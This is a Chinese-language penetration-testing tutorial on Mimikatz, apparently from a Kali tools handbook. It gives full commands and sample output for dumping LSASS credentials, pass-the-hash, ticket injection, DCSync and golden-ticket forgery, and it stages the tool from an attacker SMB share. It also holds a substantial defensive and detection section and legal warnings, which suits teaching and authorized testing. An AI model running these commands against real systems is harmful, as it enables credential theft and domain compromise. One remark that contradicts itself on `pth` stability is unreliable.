# Mimikatz（Windows 凭据提取利器）

> **一句话**：在 Windows 本机上（需管理员/SYSTEM 权限）从 **LSASS 内存**、**SAM/LSA 注册表**、**NTDS.dit** 中提取明文密码、NTLM 哈希与 Kerberos 票据，并直接用这些材料做 Pass-the-Hash / Pass-the-Ticket / Golden Ticket。
> **分类**：后渗透 / 凭据访问 ｜ **Kali 包**：`mimikatz`（**Kali 侧只提供 Windows 二进制文件，不提供可在 Linux 上运行的命令**）｜ **官方文档**：<https://github.com/gentilkiwi/mimikatz/wiki>

---

## 1. 它解决什么问题

Windows 为了支持单点登录，会把凭据材料**留在内存里**（SSO 凭据、票据、哈希缓存）。这既是设计使然，也是攻击面本身。Mimikatz 把「读取并利用这些材料」标准化了：

| 你想拿到 | Mimikatz 的命令 | 拿到后能干什么 |
|----------|-----------------|----------------|
| 明文密码 | `sekurlsa::logonpasswords` | 直接登录任意可达主机 |
| NTLM 哈希 | `sekurlsa::logonpasswords` / `lsadump::sam` | **Pass-the-Hash**（无需破解） |
| Kerberos 票据 | `sekurlsa::tickets` | **Pass-the-Ticket**（TGT/TGS 复用） |
| 域控上的全域哈希 | `lsadump::dcsync` | 伪造黄金票据 → 全域控制 |
| 注册表凭据缓存 | `lsadump::cache` / `lsadump::secrets` | 离线爆破域缓存凭据（DCC2） |
| 证书与私钥 | `crypto::certificates` / `crypto::keys` | 用于 AD CS 滥用 |

与同类对比：

| 工具 | 运行位置 | 特点 |
|------|----------|------|
| **mimikatz** | **被控 Windows 本机** | 功能最全；需落地 exe 或内存加载；被 EDR 重点盯防 |
| **`impacket-secretsdump`** | **攻击机 Linux（远程）** | 通过 DRSUAPI/远程注册表拿哈希，不落地工具 |
| **`nxc -M lsassy`** | 攻击机（远程） | 远程转储 LSASS 并解析，返回明文/哈希 |
| **`procdump`/`comsvcs.dll` MiniDump + 离线解析** | 混合 | 先转储 `lsass.dmp` 再离线分析，落盘更少 |

> **注意**：Kali 包 `mimikatz` 只提供 **Windows 可执行文件**（`mimikatz.exe`、`mimidrv.sys`、`mimilib.dll`），需要你自己把它送到 Windows 靶机上运行。**不要在 Kali 上找 `sekurlsa::` 这类命令**——Kali 里的 `mimikatz` 命令只是个「显示文件位置」的包装脚本。
>
> Linux 上想直接解析转储文件，可用 Python 实现的 `pypykatz`（**不在 Kali 工具清单中**，需自行 `pip install pypykatz`）。

---

## 2. 工作原理

### 2.1 凭据在 Windows 里的存在形式

| 位置 | 内容 | 生命周期 |
|------|------|----------|
| **LSASS 进程内存** | SSO 凭据：明文密码（若启用 WDigest）、NTLM 哈希、Kerberos 票据、DPAPI 主密钥 | 用户登录期间常驻，锁屏后部分仍存在 |
| **SAM 注册表 hive** | 本地账户的 **NT hash**（`MD4(密码)`） | 永久 |
| **SECURITY hive / LSA Secrets** | 服务账号密码、机器账户密钥、域缓存凭据（DCC2） | 永久 |
| **NTDS.dit** | 域内所有对象的 NT hash 与 Kerberos 密钥 | 永久 |
| **DPAPI 保护区** | 浏览器密码、Wi-Fi、RDP 保存的凭据 | 永久（需用户主密钥解密） |

### 2.2 为什么需要管理员/SYSTEM

- **读取 LSASS 内存**需要 `SeDebugPrivilege` —— 只有管理员才能拿到，这就是 `privilege::debug` 的作用；
- **读取注册表 hive**（SAM/SECURITY）需要 SYSTEM 权限 → `token::elevate` 把当前令牌提权到 SYSTEM；
- **加载驱动**（如 `!processprotect` 去掉 LSASS 保护）需要内核权限；
- 因此 Mimikatz 的典型开场永远是：**先提权 → 再读取**。

### 2.3 防御为何能挡住它

| 防御机制 | 效果 |
|----------|------|
| **LSA Protection（RunAsPPL）** | LSASS 成为受保护进程，普通管理员**无法**读取内存 → `sekurlsa::` 失败 |
| **Credential Guard（VBS）** | 凭据放在隔离的虚拟化安全环境里，LSASS 里**没有**可提取的明文/NT hash |
| **WDigest 默认关闭**（Win8.1+/2012R2+） | 内存里不再有明文密码 → `sekurlsa::logonpasswords` 只给哈希 |
| **禁用 NTLM** | 即使拿到哈希也不能直接横向 |
| **EDR + AMSI** | 阻断 Mimikatz 的已知特征、检测 LSASS 句柄访问 |
| **禁用 SeDebugPrivilege 分配** | 从源头掐掉读取能力 |

理解这套防御，才能真正明白 Mimikatz 的每个命令**在什么条件下会失败**。

---

## 3. 安装与快速上手

```bash
sudo apt update
sudo apt install mimikatz
mimikatz -h          # 注意：Kali 侧它只打印二进制位置，不提供 Windows 命令
```

```console
root@kali:~# mimikatz -h
/usr/share/windows-resources/mimikatz
|-- Win32
|   |-- mimidrv.sys
|   |-- mimikatz.exe
|   |-- mimilib.dll
|   |-- mimilove.exe
|   `-- mimispool.dll
|-- kiwi_passwords.yar
|-- mimicom.idl
`-- x64
    |-- mimidrv.sys
    |-- mimikatz.exe
    |-- mimilib.dll
    `-- mimispool.dll
```

**正确用法**：把对应架构的 `mimikatz.exe` 送到 Windows 靶机并执行。

```bash
# 在 Kali 上起一个 SMB 共享，让 Windows 靶机直接从共享运行（不落盘到磁盘，但仍在内存）
impacket-smbserver share /usr/share/windows-resources/mimikatz/x64 -smb2support
```

```console
# 在 Windows 靶机的 shell 里（仅授权靶机）
copy \\192.168.56.5\share\mimikatz.exe C:\Windows\Temp\m.exe
C:\Windows\Temp\m.exe
```

```console
  .#####.   mimikatz 2.2.0 (x64) built on ...
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                    with 20 modules * * */

mimikatz # 
```

也可以用 `Impacket` 起 SMB 共享后用 `evil-winrm`/`wmiexec` 直接调用 UNC 路径——见 [`impacket.md`](impacket.md)（`impacket-smbserver`）、[`evil-winrm.md`](evil-winrm.md)。

---

## 4. 核心参数详解

Mimikatz 的「命令」分为**模块（module）:: 动作（command）**。以下是最常用的一批。

### 4.1 准备阶段（几乎每次都要）

| 命令 | 作用 | 使用建议 |
|------|------|----------|
| `privilege::debug` | 获取 `SeDebugPrivilege` | **第一步**；返回 `Privilege '20' OK` 才能继续 |
| `token::elevate` | 提权到 SYSTEM | 读 SAM/SECURITY 前必做 |
| `token::whoami` | 查看当前令牌身份 | 确认是否已 SYSTEM |
| `standard::answer` / `!` | 执行系统命令（`!cmd`） | `!whoami`、`!tasklist` |
| `log <file>` | 把输出写入文件 | 留档；配合 `base64 /out:` 便于外带 |
| `exit` | 退出 | 用完即退 |

### 4.2 内存凭据（LSASS）

| 命令 | 作用 | 输出内容 |
|------|------|----------|
| `sekurlsa::logonpasswords` | **最核心**：抓所有登录会话凭据 | 用户名、域、NTLM hash、**明文密码（若可得）** |
| `sekurlsa::msv` | 只抓 NTLM 相关 | 输出更小、更快 |
| `sekurlsa::wdigest` | 抓 WDigest 明文密码 | 只有老系统/已开启 WDigest 才有明文 |
| `sekurlsa::kerberos` | 抓 Kerberos 凭据 | 含 AES 密钥 |
| `sekurlsa::tickets /export` | 导出票据到文件（`.kirbi`） | 后续 `kerberos::ptt` 或转 ccache |
| `sekurlsa::pth /user: /domain: /ntlm: /run:cmd` | **Pass-the-Hash 起进程** | 在新进程里注入凭据，比直接改内存更稳 |
| `sekurlsa::dpapi` | 抓 DPAPI 备份主密钥 | 解密浏览器/凭据管理器数据 |

### 4.3 注册表 / 本地凭据

| 命令 | 作用 | 备注 |
|------|------|------|
| `lsadump::sam` | 读本地账户 NT hash | 需 SYSTEM |
| `lsadump::secrets` | 读 LSA Secrets | 含机器账户密钥、服务账号 |
| `lsadump::cache` | 读域缓存凭据（DCC2） | `hashcat -m 2100` 离线爆破 |
| `lsadump::lsa /patch` | 打补丁方式导出 LSA 数据 | 老技巧，现代系统常失败 |
| `lsadump::dcsync /domain:contoso.local /user:krbtgt` | **DCSync**：模拟域控复制 | 需复制权限；**不落地文件**、目标无工具 |
| `lsadump::dcsync /all /csv` | 导出全域账号 | 输出极大，慎用 |

### 4.4 Kerberos 票据伪造

| 命令 | 作用 | 关键参数 |
|------|------|----------|
| `kerberos::golden` | 伪造**黄金票据**（用 `krbtgt` hash 签 TGT） | `/user:` `/domain:` `/sid:` `/krbtgt:` `/ptt` `/ticket:` |
| `kerberos::golden /service:MSSQLSvc/...` | 伪造**白银票据**（用服务账号 hash 签 TGS） | `/service:` 指定 SPN，`/rc4:` 或 `/aes256:` |
| `kerberos::ptt <file.kirbi>` | 把票据注入当前会话 | 之后访问服务即用该票据身份 |
| `kerberos::list` / `/export` | 列出/导出当前会话票据 | 配合 `-K` 给 evil-winrm 用 |
| `kerberos::purge` | 清空当前票据 | 换身份前清理 |

### 4.5 其它高价值模块

| 命令 | 作用 | 备注 |
|------|------|------|
| `crypto::certificates /systemstore:local_machine /export` | 导出本机证书与私钥 | AD CS 攻击常靠这个 |
| `crypto::keys /export` | 导出 CNG 私钥 | 同上 |
| `dpapi::chrome /in:...` | 解密 Chrome 保存的密码 | 需用户主密钥 |
| `vault::cred /patch` | 查看/解密 Windows 凭据保管库 | Win7+ |
| `process::modules` / `driver::` | 查看进程模块与驱动 | 排查 EDR 与 PPL 状态 |
| `!processprotect /process:lsass.exe /remove` | 去掉 LSASS 保护（**需加载 mimidrv 驱动**） | 高风险、强特征；RunAsPPL 下常失败 |
| `misc::skeleton` | 万能密码后门（`mimikatz`） | 需注入到域控 `lsass`；极强特征，**仅用于证明风险** |
| `base64 /out:true` | 输出 base64，便于复制 | 无文件/剪贴板外带时用 |

---

## 5. 实战演练

> **环境声明**：以下全部在**自建 Windows 靶机**（未打补丁的 Windows 10/Server 评测虚拟机，**Host-Only 网络**）上执行，且该靶机必须是你**拥有或已获书面授权**的。
> **绝对禁止在他人生产环境执行 `sekurlsa::logonpasswords`**：它读取的是**真实用户的明文密码**，属于最敏感的凭据窃取行为，法律后果严重。

### 场景 1：本机抓凭据的最小流程

```console
C:\Windows\Temp> m.exe
```

```console
mimikatz # privilege::debug
Privilege '20' OK
```

```console
mimikatz # sekurlsa::logonpasswords
```

```console
Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WEB01$
Domain            : CONTOSO
Logon Server      : (null)
        msv :
         [00000003] Primary
         * Username : WEB01$
         * Domain   : CONTOSO
         * NTLM     : 8f0e2a...          ← 机器账户 NT hash
        kerberos :
         * Username : WEB01$
         * Domain   : CONTOSO.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       9c1f...      ← 机器账户 AES 密钥

Authentication Id : 0 ; 240853 (00000000:0003acd5)
Session           : Interactive from 1
User Name         : Administrator
Domain            : CONTOSO
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CONTOSO
         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
        wdigest :
         * Username : Administrator
         * Domain   : CONTOSO
         * Password : (null)            ← WDigest 已关闭，无明文（现代系统常态）
        tspkg :
         * Username : Administrator
         * Domain   : CONTOSO
         * Password : (null)
```

**解读**：

- 每一段 `Authentication Id` = 一个登录会话（**服务会话 `Service from 0` = 机器账户**，交互会话 `Interactive from 1` = 真人用户）。
- `msv` 段给 **NTLM hash** → 可直接 PTH。
- `wdigest` 段 `(null)` 说明 WDigest 明文缓存已关闭（现代 Windows 默认）；**如果这里有明文密码，那台机器就极其危险**。
- `kerberos` 的 `Key List` 给 **AES 密钥** → 伪造票据时优先用它（比 RC4 隐蔽）。
- 机器账户 `WEB01$` 的哈希可用于**白银票据**（伪造访问本机服务的票据）。

清理与留档：

```console
mimikatz # log C:\Windows\Temp\mimi.log
mimikatz # sekurlsa::logonpasswords
mimikatz # exit
```

```bash
# 取回日志到攻击机
evil-winrm -i 192.168.56.20 -u Administrator -p 'Passw0rd!' 
*Evil-WinRM* PS C:\> download C:\Windows\Temp\mimi.log /tmp/mimi.log
```

### 场景 2：从哈希到横向（PTH + 票据 + DCSync）

```console
:: ① 用抓到的 hash 起一个新进程（新进程里带凭据）
mimikatz # sekurlsa::pth /user:Administrator /domain:CONTOSO /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:cmd.exe
```

```console
user    : Administrator
domain  : CONTOSO
program : cmd.exe
impers. : no
NTLM    : 31d6cfe0d16ae931b73c59d7e0c089c0

  |  PID  |  TID  |
  ...
:: 弹出的新 cmd.exe 里：
C:\> dir \\FILE01\C$      ← 以 Administrator 身份访问，PTH 成功
```

**解读**：`pth` 会**弹出新进程**并在其中注入凭据，比 `sekurlsa::pth`（改内存）稳定。验证成功的最直接方式就是 `dir \\\\target\C$` 能列出目录。

```console
:: ② 导出票据 → 注入 → 访问别的服务
mimikatz # sekurlsa::tickets /export
Directory: C:\Windows\Temp
   20240915_120000_Administrator@krbtgt-CONTOSO.LOCAL.kirbi
mimikatz # kerberos::ptt 20240915_120000_Administrator@krbtgt-CONTOSO.LOCAL.kirbi
mimikatz # kerberos::list
```

**解读**：`.kirbi` 可转换为 Linux 用的 `ccache`（`impacket-ticketConverter ticket.kirbi ticket.ccache`），然后：

```bash
export KRB5CCNAME=ticket.ccache
evil-winrm -i web01.contoso.local -r contoso.local -K ticket.ccache
```

```console
:: ③ DCSync：只需要权限，不需要在域控上落地任何工具
mimikatz # lsadump::dcsync /domain:contoso.local /user:krbtgt
```

```console
[DC] 'contoso.local' will be the domain
[DC] 'dc01.contoso.local' will be the DC server
[DC] Object : contoso\krbtgt
        Credentials:
        * NTLM     : f1e2d3c4b5a6978877665544332211fa
        * aes256_hmac : 8b7c6d5e4f3a2b1c...
```

```console
:: ④ 用 krbtgt hash 伪造黄金票据（全域通行）
mimikatz # kerberos::golden /user:FakeAdmin /domain:contoso.local \
           /sid:S-1-5-21-1111111111-2222222222-3333333333 \
           /krbtgt:f1e2d3c4b5a6978877665544332211fa /ptt
mimikatz # misc::cmd          ← 弹出以自己身份运行的 cmd
```

**解读**：拿到 `krbtgt` 哈希 = **全域持久控制**（可伪造任意用户的 TGT）。这也是为什么重置 `krbtgt` 密码必须**连续做两次**（否则旧票据仍有效）。

### 场景 3：防御机制生效时的表现（教你怎么判断「打不动了」）

```console
mimikatz # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061   ← 拿不到 SeDebugPrivilege
```

| 现象 | 原因 | 说明 |
|------|------|------|
| `RtlAdjustPrivilege (20) c0000061` | 当前进程不是管理员/被限制 | 需要更高权限上下文 |
| `sekurlsa::logonpasswords` 报 `ERROR kuhl_m_sekurlsa_acquireLSA` | **LSASS 被保护（RunAsPPL）** 或 EDR 拦截 | 防御生效，这是正常的「失败」 |
| 只有 NTLM hash，`wdigest` 为 `(null)` | WDigest 明文缓存已关闭 | 正常现象（Win8.1+ 默认） |
| 所有凭据都是 `(null)` | **Credential Guard 生效** | 凭据在隔离环境，LSASS 里没有 |
| `!processprotect` 加载驱动失败 | 驱动签名强制 / 无法加载未签名驱动 | 现代系统的正常防御 |
| `lsadump::dcsync` 报 `Access denied` | 无 `Replicating Directory Changes` 权限 | 需先通过 BloodHound 找路径拿权限 |
| Mimikatz 一落地就被杀 | Defender/EDR 特征 | 说明防护有效；记录为测试结论 |

**解读**：能读到「失败」的信息本身就是有价值的交付物——**它证明了哪些防御措施到位**。授权测试中应如实记录：`LSASS 受 PPL 保护，本地凭据提取失败`。

---

## 6. 输出解读

| 输出字段 | 含义 | 下一步 |
|----------|------|--------|
| `Authentication Id : 0 ; N` | 一个登录会话 | 按 `Session: Interactive/Service/Network` 区分真人/服务 |
| `msv` → `* NTLM : <32 hex>` | **NT hash** | PTH（`crackmapexec -H`、`evil-winrm -H`、`sekurlsa::pth`） |
| `wdigest` → `* Password : <明文>` | 明文密码（**高危配置**） | 直接登录；作为「WDigest 未关闭」的证据 |
| `kerberos` → `aes256_hmac` | AES 密钥 | 伪造票据（优先于 RC4） |
| `* Username : HOST$` | **机器账户** | 白银票据、计算机账号滥用 |
| `lsadump::cache` 输出 | DCC2（域缓存凭据） | `hashcat -m 2100` 离线爆破 |
| `lsadump::dcsync` 的 `Credentials` | 域内凭据 | 伪造黄金票据 / 直接 PTH |
| `ERROR kuhl_m_sekurlsa_acquireLSA` | LSASS 被保护 | 换远程方式（`secretsdump`/`nxc -M lsassy`）或记录为防御生效 |
| `Privilege '20' OK` | 拿到 SeDebugPrivilege | 可以继续读取 |

---

## 7. 与其他工具配合

```
① 落脚（WinRM / WMI / SMB）        evil-winrm / impacket-wmiexec
        │
② 提权到本地管理员/SYSTEM          winPEAS（见 linpeas.md）、内核漏洞
        │
③ 抓凭据  ┌─ 本地：mimikatz（本文）sekurlsa:: / lsadump::
          ├─ 远程：impacket-secretsdump（DCSync / 注册表）
          └─ 远程：nxc -M lsassy（不落地）
        │
④ 破解（可选）  hashcat -m 1000(NT) / 2100(DCC2) / 5500(NetNTLMv2)
        │
⑤ 复用凭据  PTH → nxc / evil-winrm / impacket-psexec
            票据 → impacket-ticketConverter → KRB5CCNAME → evil-winrm -K
        │
⑥ 扩大战果  bloodhound 找路径 → 攻陷域管登录过的主机 → 回到 ③
```

- 远程批量抓取：[`impacket.md`](impacket.md)、[`netexec.md`](netexec.md)
- 交互式落脚：[`evil-winrm.md`](evil-winrm.md)
- 提权检查：[`linpeas.md`](linpeas.md)（`winPEASx64.exe`）
- 攻击路径：[`bloodhound.md`](bloodhound.md)
- 破解：[`../04-口令攻击/`](../04-口令攻击/)

---

## 8. 常见坑与排错

| 报错/现象 | 原因 | 解决 |
|-----------|------|------|
| 在 Kali 上敲 `sekurlsa::logonpasswords` 报 unknown command | **Kali 的 `mimikatz` 不是 Windows 版本** | 把 `/usr/share/windows-resources/mimikatz/x64/mimikatz.exe` 传到 Windows 靶机运行 |
| `ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege` | 当前进程无管理员权限 | 先提权；或 `runas` 以管理员启动 |
| `ERROR kuhl_m_sekurlsa_acquireLSA` | LSASS 句柄打开失败：PPL 保护 / EDR / 权限不足 | 检查 `RunAsPPL`；换远程方案（`secretsdump`）；确认是管理员 |
| `sekurlsa::logonpasswords` 只出 hash 无明文 | WDigest 已关闭（正常） | 别指望明文；用 hash 做 PTH，或找配置里的明文 |
| 全部 `(null)` | Credential Guard 开启 | 记录为防御生效；改打「有其他主机凭据」的目标 |
| `lsadump::sam` 报 access denied | 不是 SYSTEM | `token::elevate` 后重试 |
| `!processprotect` 无效果 | 驱动未加载/签名强制 | 现代系统正常防御，放弃该路径 |
| 落地 exe 立刻被删 | Defender/EDR 特征命中 | 换远程方式；或在授权测试中记录 |
| 中文/Unicode 输出乱码 | 终端代码页 | `chcp 65001`；或用 `log` 写文件再取回 |
| 32/64 位用错 | 位数不匹配 | x64 系统用 `x64/mimikatz.exe`；有些场景需要 32 位版本才能读 32 位进程 |
| 票据注入后访问仍失败 | 票据是给别的 SPN/服务的（白银票据） | 检查 `/service:` 是否与你访问的目标一致 |
| 黄金票据不生效 | `krbtgt` hash 过期 / 域 SID 写错 / 时间偏差 | 重新 DCSync；核对 `/sid:`；与 DC 对时 |
| DCSync 报 `Access denied` | 无复制权限 | 先用 BloodHound 找有权限的账号 |

---

## 9. 防御视角（蓝队）

**这里是本文最重要的部分**：Mimikatz 的绝大多数攻击都能被正确配置的 Windows 挡住。

| 防御措施 | 阻断的攻击 | 部署方式 |
|----------|------------|----------|
| **LSA Protection（RunAsPPL）** | `sekurlsa::*` 读取 LSASS | 注册表 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL=1`（+ UEFI 锁更佳） |
| **Credential Guard（VBS/HVCI）** | 内存中的 NTLM hash 与派生凭据提取 | 组策略 / Intune 开启，需硬件支持与 UEFI 锁 |
| **禁用 WDigest 明文缓存** | `wdigest` 段拿到明文密码 | `HKLM\...\SecurityProviders\WDigest\UseLogonCredential=0`（Win8.1+ 默认） |
| **LAPS** | 本地管理员 hash 复用横向 | 部署 Windows LAPS，让每台机器密码唯一且自动轮换 |
| **禁用 NTLM** | PTH 横向 | 域内先审计（`Network security: Restrict NTLM`）再强制 |
| **限制 SeDebugPrivilege** | 读取任意进程内存 | 通过用户权限分配策略移除普通管理员 |
| **分层管理（Tier Model）** | 域管凭据出现在 Tier 1/2 主机内存 | 域管只登录 DC；服务器/工作站各用专用管理账号；PAW |
| **禁用「不受约束的委派」+ 收紧 ACL** | 用委派/ACL 提升到域管 | 改 RBCD；定期审计 |
| **`krbtgt` 双次重置** | 黄金票据 | 按计划（或疑似失陷后）连续两次重置 |
| **EDR + AMSI + Defender 篡改保护** | Mimikatz 落地/内存加载、LSASS 读取行为 | 部署 EDR，开启云保护与篡改保护 |

**必须监控的日志与信号**：

| 事件 | 说明 |
|------|------|
| **4656 / 4663** | 对 LSASS 进程的句柄请求/访问（尤其 `0x1010`、`0x1410` 权限掩码）→ 用 **Sysmon Event ID 10**（ProcessAccess）更实用 |
| **4624 类型 3（NTLM）** | 网络登录，同一账号跨多主机 → PTH/横向信号 |
| **4672** | 分配了特殊权限（含 SeDebugPrivilege） |
| **4768 / 4769 / 4771** | Kerberos TGT/TGS 请求、预认证失败 → Kerberoasting / AS-REP / 黄金票据 |
| **4662** | 目录服务对象访问（DCSync 的核心信号） |
| **7045 / 4697** | 服务安装（PsExec 式横向） |
| **Sysmon 10** | `TargetImage = lsass.exe` 且来源非系统进程 → **Mimikatz/lsassy 的直接信号** |
| **Sysmon 1** | `wsmprovhost.exe` → `cmd.exe`、异常父进程链 |
| **Sysmon 7/8** | 镜像加载/远程线程创建（`CreateRemoteThread`） |

**蓝队自测建议**：在隔离的测试机上跑一次 Mimikatz，确认你的 EDR 是否告警。**能探测到的才是有效防御**；只写在策略里而没人验证的控制项，通常等于没有。

---

## 10. 参考

- Mimikatz 官方 Wiki（模块与命令全集）：<https://github.com/gentilkiwi/mimikatz/wiki>
- 官方博客：<https://blog.gentilkiwi.com/mimikatz>
- Kali 工具页：<https://www.kali.org/tools/mimikatz/>
- LSA Protection 与 Credential Guard（Microsoft Learn）：搜索 "Configuring Additional LSA Protection"、"Credential Guard"
- Sysmon 进程访问事件：<https://learn.microsoft.com/sysinternals/downloads/sysmon>
- 本地文件位置：`ls /usr/share/windows-resources/mimikatz/`、`mimikatz -h`

## ⚠️ 法律与伦理

Mimikatz 提取的是**用户明文密码与凭据哈希**，属于最敏感的个人信息与认证凭据。在未授权环境下运行，可能触犯《刑法》第 285 条（非法获取计算机信息系统数据、非法控制计算机信息系统）、第 286 条，并违反《网络安全法》《数据安全法》《个人信息保护法》（非法处理个人信息）。**即使只是「跑一下看看」，也已经构成既遂的非法获取行为。**

本教程仅用于：**有书面授权的渗透测试与红队演练、CTF、自建 Windows 靶场与实验室、蓝队检测能力验证**。请务必：
1. 在授权范围内、事先约定的时间窗内操作；
2. 仅在**自有或明确授权**的靶机（如自建未打补丁虚拟机）上执行示例；
3. 提取到的任何凭据**不得留存、传播或复用**于授权范围之外；
4. 报告中对所有凭据做脱敏处理（仅体现「可提取」的事实，不粘贴真实口令）。
